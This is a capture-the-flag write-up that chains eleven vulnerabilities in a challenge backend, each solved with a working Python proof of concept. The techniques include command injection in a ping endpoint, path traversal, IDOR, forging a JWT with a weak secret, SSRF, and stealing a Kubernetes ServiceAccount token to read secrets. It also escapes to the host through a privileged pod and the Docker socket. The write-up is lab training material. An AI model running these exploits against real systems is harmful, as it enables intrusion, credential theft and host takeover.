# HAMAMOOZ Backend Security Audit Writeup

## Global Setup

The following setup authenticates as a normal user and defines two helper functions used by the later PoCs:

- `rce(cmd)` exploits the command-injection vulnerability in `/api/diag/ping` and executes an arbitrary shell command in the backend container.
- `kc(args)` uses that command execution to invoke `kubectl` against the cluster's Kubernetes API using the pod's mounted ServiceAccount credentials.

The authentication token is reused by the authenticated endpoints and by the command-injection chain.

```python
import warnings, requests, tarfile, io, re, jwt, base64, json, time
warnings.filterwarnings("ignore")
requests.packages.urllib3.disable_warnings()

BASE = "https://ctf.seoeh.ir"
REG = "https://hub.hamdocker.ir"
REPO = "seoeh/hamamooz_challlenges"
F = {}

# Auth & Token
requests.post(f"{BASE}/auth/register", json={"username":"sv","password":"Sv123!"}, verify=False, timeout=20)
TK = requests.post(f"{BASE}/auth/login", json={"username":"sv","password":"Sv123!"}, verify=False, timeout=20).json()["token"]

# Helper: Command Injection (Flag 9)
def rce(cmd):
    r = requests.post(f"{BASE}/api/diag/ping",
      headers={"Authorization":f"Bearer {TK}","Content-Type":"application/json"},
      json={"host":f"127.0.0.1; {cmd}"}, verify=False, timeout=30)
    try: return r.json().get("output","")
    except: return ""

# Helper: Kubectl via RCE
def kc(a):
    return rce(f'kubectl --server=https://kubernetes.default.svc '
      f'--token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) '
      f'--certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt {a}')
```

---

## Flag 1 — Docker Layer Leakage

**Category:** Container Security  
**Vulnerability:** Sensitive build-time files remain recoverable from Docker image layers even after being deleted in a later layer. Because image layers are immutable, removing `.env` in a later layer does not remove its contents from earlier layers.

**Extraction:**
1. Obtain a pull token for the target repository and query the `backend` image manifest through the Registry v2 API.2. Read the layer digests from the Docker manifest and download each layer blob.
3. Download and extract each layer as a tarball.
4. Enumerate the files in each layer tarball and inspect files whose path contains `.env` for the flag pattern.

**PoC (Python):**
```python
# F1: Docker Registry - layer blob → .env
tk=requests.get(f"{REG}/artifactory/api/docker/hub/v2/token",
  params={"service":"hub.hamdocker.ir","scope":f"repository:{REPO}:pull"}).json()["token"]
hd={"Authorization":f"Bearer {tk}","Accept":"application/vnd.docker.distribution.manifest.v2+json"}
mf=requests.get(f"{REG}/v2/{REPO}/manifests/backend",headers=hd,timeout=30).json()
for L in mf["layers"]:
    if L["size"]>10_000_000: continue
    r=requests.get(f"{REG}/v2/{REPO}/blobs/{L['digest']}",headers=hd,timeout=30)
    if r.status_code!=200: continue
    try:
        with tarfile.open(fileobj=io.BytesIO(r.content),mode="r:gz") as t:
            for m in t.getmembers():
                if ".env" in m.name and m.isfile():
                    x=re.search(r'HAMAMOOZ\{[^}]+\}',t.extractfile(m).read().decode(errors="ignore"))
                    if x: F["F1"]=x.group(0); break
    except: pass
    if "F1" in F: break
```

---

## Flag 2 — Exposed Swagger Schema

**Category:** Information Disclosure  
**Vulnerability:** The production backend exposes its Swagger/OpenAPI schema at `/swagger.json`, and the schema contains sensitive information including the flag.

**Extraction:**
1. Request `/swagger.json`.
2. Search the response body for the `HAMAMOOZ{...}` pattern.
3. The flag is returned directly in the OpenAPI document.

**PoC:**
```python
# F2: Swagger info disclosure
x=re.search(r'HAMAMOOZ\{[^}]+\}',requests.get(f"{BASE}/swagger.json",verify=False,timeout=20).text)
if x: F["F2"]=x.group(0)
```

---

## Flag 3 — Debug Endpoint with X-Debug-Mode Header

**Category:** Broken Access Control  
**Vulnerability:** The internal endpoint `/api/internal/flag` can be accessed by supplying the custom header `X-Debug-Mode: true`; the endpoint does not require the normal authentication token.

**Extraction:**
1. Discover the endpoint from the Swagger schema.
2. Send a GET request with the debug header.
3. The endpoint returns the flag in a JSON response.

**PoC:**
```python
# F3: Internal endpoint + debug header bypass
r=requests.get(f"{BASE}/api/internal/flag",headers={"X-Debug-Mode":"true"},verify=False,timeout=20)
if r.status_code==200: F["F3"]=r.json().get("flag")
```

---

## Flag 4 — Path Traversal in File Download

**Category:** Web / Injection  
**Vulnerability:** The `/api/reports/download` endpoint accepts a `file` query parameter that is not sanitized against directory traversal, allowing arbitrary file reads outside the intended directory.

**Extraction:**

1. Supply a relative path containing `../` sequences to escape the intended reports directory.
2. Request `../../../app/flag.txt`.
3. The endpoint returns the contents of the requested file, including the flag.

**PoC:**
```python
# F4: Path traversal
x=re.search(r'HAMAMOOZ\{[^}]+\}',
  requests.get(f"{BASE}/api/reports/download",params={"file":"../../../app/flag.txt"},verify=False,timeout=20).text)
if x: F["F4"]=x.group(0)
```

---

## Flag 5 — Insecure Direct Object Reference (IDOR)

**Category:** Broken Access Control  
**Vulnerability:** The `/api/orgs/{org_id}/reports/{report_id}` endpoint trusts user-supplied `org_id` and `report_id` parameters without validating ownership, allowing cross-tenant data leakage.

**Extraction:**
1. Register a normal user and obtain a JWT.
2. Enumerate a small range of `org_id` and `report_id` values using the valid JWT.
3. One of the queried object IDs returns data belonging to another organization, and the response contains the flag.

**PoC:**
```python
# Token
requests.post(f"{BASE}/auth/register",json={"username":"sv","password":"Sv123!"},verify=False,timeout=20)
TK=requests.post(f"{BASE}/auth/login",json={"username":"sv","password":"Sv123!"},verify=False,timeout=20).json()["token"]

# F5: IDOR
for o in range(1,6):
    for p in range(1,6):
        r=requests.get(f"{BASE}/api/orgs/{o}/reports/{p}",headers={"Authorization":f"Bearer {TK}"},verify=False,timeout=10)
        if r.status_code==200:
            x=re.search(r'HAMAMOOZ\{[^}]+\}',r.text)
            if x: F["F5"]=x.group(0); break
    if "F5" in F: break
```

---

## Flag 6 — Weak JWT Secret

**Category:** Authentication Bypass  
**Vulnerability:** The backend signs JWTs with a trivially weak secret (`changeme123`). Attackers can forge arbitrary tokens with escalated privileges (e.g., `role: admin`).

**Extraction:**

1. Construct a JWT containing an administrator identity and `role: admin`.
2. Sign the token using the weak secret `changeme123` and the `HS256` algorithm.
3. Send the forged token to `/admin/dashboard`.
4. The endpoint accepts the forged token and returns the flag.

**PoC (Python):**
```python
# F6: Weak JWT secret
fg=jwt.encode({"sub":"999","username":"admin","org":"Acme Corp","role":"admin"},"changeme123",algorithm="HS256")
r=requests.get(f"{BASE}/admin/dashboard",headers={"Authorization":f"Bearer {fg}"},verify=False,timeout=20)
if r.status_code==200: F["F6"]=r.json().get("flag")
```

---

## Flag 7 — Excessive Kubernetes RBAC Permissions

**Category:** Cloud / Kubernetes  
**Vulnerability:** The backend pod's ServiceAccount has excessive Kubernetes RBAC permissions, allowing it to read a Secret in the `ctf-secrets` namespace. The ServiceAccount token is available inside the pod at `/var/run/secrets/kubernetes.io/serviceaccount/token`.

**Extraction:**

1. Use command injection to execute `kubectl` from inside the backend pod.
2. Authenticate to the Kubernetes API using the pod's mounted ServiceAccount token and CA certificate.
3. Read the `flag-secret` Secret from the `ctf-secrets` namespace.
4. Extract the base64-encoded `data.flag` value and decode it.

**PoC:**
```python
# F7: RCE → kubectl → K8s secret
x=re.search(r'([A-Za-z0-9+/=]{20,})',kc("get secret flag-secret -n ctf-secrets -o jsonpath='{.data.flag}'"))
if x:
    try: F["F7"]=base64.b64decode(x.group(1)).decode()
    except: pass
```

---

## Flag 8 — Privileged Pod with hostPath Escape

**Category:** Container / Kubernetes Escape  
**Vulnerability:** A pod named `legacy-worker` in the `escape-zone` namespace runs with `securityContext.privileged: true` and a `hostPath` volume mounting the host's root filesystem at `/host`. Combined with the ability to execute commands in the pod, the `hostPath` mount exposes the node's filesystem to the container.

**Extraction:**
1. Use the command-injection primitive to invoke `kubectl` from inside the backend container.
2. Execute `cat /host/var/lib/node-data/flag.txt` inside the `legacy-worker` pod.
3. The mounted host filesystem exposes the flag file directly.

**PoC:**
```python
# F8: RCE → kubectl exec → privileged pod hostPath
x=re.search(r'HAMAMOOZ\{[^}]+\}',
  kc("exec -n escape-zone legacy-worker -- cat /host/var/lib/node-data/flag.txt"))
if x: F["F8"]=x.group(0)
```

---

## Flag 9 — Command Injection in Diagnostic Endpoint

**Category:** Web / Injection  
**Vulnerability:** The `/api/diag/ping` endpoint accepts a `host` parameter and passes it unsanitized to a shell command, allowing arbitrary OS command execution via `;` or `&&` injection.

**Extraction:**
1. Authenticate to obtain a JWT.
2. Send a POST request with an injected shell command using `127.0.0.1; <command>`.
3. The command's stdout is returned in the JSON `output` field.
4. Read `/proc/1/environ` and extract `FLAG_F9`.

**PoC:**
```python
# F9: Command injection → env
x=re.search(r'FLAG_F9=(HAMAMOOZ\{[^}]+\})',rce("cat /proc/1/environ|tr '\\0' '\\n'|grep FLAG_F9"))
if x: F["F9"]=x.group(1)
```

---

## Flag 10 — Server-Side Request Forgery (SSRF)

**Category:** Web / SSRF  
**Vulnerability:** The `/api/webhooks/test` endpoint accepts a URL and makes an HTTP request from the server's perspective. This allows attackers to reach internal Kubernetes services that are not exposed to the internet.

**Extraction:**

1. Target the internal Kubernetes service `admin-panel` using its cluster DNS name.
2. Send the URL to `/api/webhooks/test`.
3. The backend performs the request server-side.
4. The response body contains the flag.

**PoC:**
```python
# F10: SSRF
x=re.search(r'HAMAMOOZ\{[^}]+\}',
  requests.post(f"{BASE}/api/webhooks/test",headers={"Content-Type":"application/json"},
    json={"url":"http://admin-panel.internal-tools.svc.cluster.local/","method":"GET"},
    verify=False,timeout=20).text)
if x: F["F10"]=x.group(0)
```

---

## Flag 11 — Docker Daemon Abuse via Socket

**Category:** Container / Host Escape  
**Vulnerability:** The privileged `legacy-worker` pod exposes the host's Docker daemon socket at `/host/run/docker.sock`. Access to the Docker API allows an attacker to create containers with arbitrary bind mounts, including mounting the host root filesystem into a new container.

**Extraction:**

1. Use the command-injection primitive to invoke `kubectl exec` into the privileged `legacy-worker` pod.
2. From inside that pod, access the host-mounted Docker socket at `/host/run/docker.sock`.
3. Send a Docker API request to `/containers/create` and create an Alpine container whose root filesystem is the Docker host's `/`, mounted read-only at `/realhost`.
4. Start the newly created container.
5. Retrieve its logs; the container executes `cat /realhost/home/ubuntu/flag.txt`, which returns the flag.

**PoC:**
```python
# F11: RCE → kubectl exec → docker socket → container escape
p=base64.b64encode(json.dumps({"Image":"hub.hamdocker.ir/alpine:3.19","Cmd":["cat","/realhost/home/ubuntu/flag.txt"],"HostConfig":{"Binds":["/:/realhost:ro"]}}).encode()).decode()
out=kc(f"exec -n escape-zone legacy-worker -- /bin/sh -c 'echo {p} | base64 -d | curl -s --unix-socket /host/run/docker.sock -X POST -H \"Content-Type: application/json\" -d @- http://localhost/containers/create'")
m=re.search(r'"Id":"([a-f0-9]+)"',out)
if m:
    kc(f"exec -n escape-zone legacy-worker -- /bin/sh -c 'curl -s --unix-socket /host/run/docker.sock -X POST http://localhost/containers/{m.group(1)}/start'")
    time.sleep(2)
    logs=kc(f"exec -n escape-zone legacy-worker -- /bin/sh -c 'curl -s --unix-socket /host/run/docker.sock \"http://localhost/containers/{m.group(1)}/logs?stdout=true&stderr=true\"'")
    x=re.search(r'HAMAMOOZ\{[^}]+\}',logs)
    if x: F["F11"]=x.group(0)

for i in range(1,12): print(f"F{i}: {F.get(f'F{i}','[NOT FOUND]')}")
```